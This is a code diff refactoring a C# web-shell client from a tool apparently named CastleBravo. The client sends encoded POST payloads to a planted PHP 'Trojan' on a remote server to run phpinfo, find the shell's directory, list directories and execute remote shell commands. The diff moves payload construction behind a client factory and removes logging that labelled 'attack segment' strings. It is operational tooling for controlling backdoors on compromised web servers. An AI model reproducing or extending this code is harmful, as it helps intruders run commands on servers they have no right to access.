@@ -1,30 +1,20 @@
 ﻿using C2.Core;
-using C2.Utils;
 using System;
 using System.Collections.Generic;
 using System.Linq;
-using System.Net;
-using System.Net.Cache;
-using System.Text;
 
 namespace C2.Business.CastleBravo.WebShellTool
 {
     public class WebShellClient
     {
-        private readonly string url;
-        private readonly string prefix;
-        private readonly StringBuilder sb;
-        private readonly WebShellClientSetting clientSetting;
-       
-
-        public string FetchLog() { string ret = sb.ToString(); sb.Clear(); return ret; }
+        private readonly string url;       
+        private readonly IClient client;
+        public string FetchLog() { return client.FetchLog(); }
 
         public WebShellClient(string url, string password, string clientSetting)
         {
             this.url = url;
-            this.clientSetting = WebShellClientSetting.LoadSetting(clientSetting);
-            this.prefix = password + "=" + this.clientSetting.PHP_MAKE + "&" + this.clientSetting.ACTION;
-            this.sb = new StringBuilder();
+            this.client = ClientFactory.Create(password, clientSetting);
         }
 
         public Tuple<string, string> ShellStart()
@@ -97,107 +87,23 @@ namespace C2.Business.CastleBravo.WebShellTool
         }
         public string PHPInfo()
         {
-            string payload = String.Format("{0}={1}", prefix, clientSetting.PHP_INFO);
-
-            sb.AppendLine("phpinfo:")
-              .AppendLine(payload)
-              .AppendLine(string.Format("引导段:{0}", prefix))
-              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INFO)))
-              .AppendLine();
-
-            return Post(payload);
+            return client.MidStrEx(WebClientEx.Post(this.url, client.PHPInfo()));
         }
 
-        private List<string> PHPIndex()
+        public List<string> PHPIndex()
         {
-            string payload = String.Format("{0}={1}", prefix, clientSetting.PHP_INDEX);
-
-            sb.AppendLine("定位Trojan所在目录:")
-              .AppendLine(payload)
-              .AppendLine(string.Format("引导段:{0}", prefix))
-              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INDEX)))
-              .AppendLine();
-
-            string[] result = Post(payload).Split('\t');
+            string[] result = client.MidStrEx(WebClientEx.Post(this.url, client.PHPIndex())).Split('\t');
             return result.Skip(0).Take(result.Length - 1).ToList();
         }
 
-        private string PHPReadDict(string path)
+        public string PHPReadDict(string dict)
         {
-            string payload = String.Format("{0}={1}&{2}={3}", 
-                prefix, 
-                clientSetting.PHP_READDICT, 
-                clientSetting.PARAM1, 
-                Encode(path));
-            
-            sb.AppendLine("遍历目录:")
-              .AppendLine(payload)
-              .AppendLine(string.Format("引导段:{0}", prefix))
-              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_READDICT)))
-              .AppendLine(string.Format("参数一:{0}", ST.SuperDecodeBase64(path)))
-              .AppendLine();
-
-            return Post(payload);
+            return client.MidStrEx(WebClientEx.Post(this.url, client.PHPReadDict(dict)));
         }
 
-        private string PHPShell(string shellEnv, string command)
+        public string PHPShell(string shellEnv, string command)
         {
-            string payload = String.Format("{0}={1}&{2}={3}&{4}={5}",
-                prefix,
-                clientSetting.PHP_SHELL,
-                clientSetting.PARAM1,
-                Encode(shellEnv),
-                clientSetting.PARAM2,
-                Encode(command));
-
-            sb.AppendLine("Remote Command:" + command)
-              .AppendLine(payload)
-              .AppendLine(string.Format("引导段:{0}", prefix))
-              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_SHELL)))
-              .AppendLine(string.Format("参数一:{0}", ST.SuperDecodeBase64(shellEnv)))
-              .AppendLine(string.Format("参数二:{0}", ST.SuperDecodeBase64(command)))
-              .AppendLine();
-
-            return Post(payload);
-        }
-
-        private string Post(string payload)
-        {    
-            string response = string.Empty;
-            try
-            {
-                byte[] bytes = Encoding.Default.GetBytes(payload);
-                using (GuarderUtil.WaitCursor)
-                    // TODO: 测试时发现webclient必须每次new一个新的才行, 按道理不应该
-                    bytes = WebClientEx.Create()
-                                       .UploadData(url, "POST", bytes);
-
-                response = Encoding.Default.GetString(bytes); 
-            }
-            catch (Exception ex)
-            {
-                sb.AppendLine(ex.Message);
-            }
-
-            return MidStrEx(response, clientSetting.SPL, clientSetting.SPR);
-        }
-
-        private string MidStrEx(string sourse, string spl, string spr)
-        {
-            int splIndex = sourse.IndexOf(spl);
-            if (splIndex == -1) return string.Empty;
-
-            sourse = sourse.Substring(splIndex + spl.Length);
-
-            int sprIndex = sourse.IndexOf(spr);
-            if (sprIndex == -1) return string.Empty;
-
-            return sourse.Remove(sprIndex);
-        }
-
-        private string Encode(string str)
-        {
-            return Uri.UnescapeDataString(ST.EncodeBase64(str));  // HttpUtility.UrlEncode有+号坑,代替之
+            return client.MidStrEx(WebClientEx.Post(this.url, client.PHPShell(shellEnv, command)));
         }
     }
 
@@ -223,32 +129,6 @@ namespace C2.Business.CastleBravo.WebShellTool
             CreateTime = createTime;
             FileSize = fileSize;
             LastMod = lastMod;
-        }
-    }
-
-
-    public class WebClientEx : WebClient
-    {
-        public int Timeout { get; set; }
-
-        protected override WebRequest GetWebRequest(Uri address)
-        {
-            var request = base.GetWebRequest(address);
-            request.Timeout = Timeout;
-            return request;
-        }
-
-        public static WebClientEx Create()
-        {
-            WebClientEx one = new WebClientEx()
-            {
-                Timeout = 30000,              // 30秒
-                Encoding = Encoding.Default,
-                CachePolicy = new RequestCachePolicy(RequestCacheLevel.NoCacheNoStore)
-            };
-
-            one.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
-            return one;
         }
     }
 }
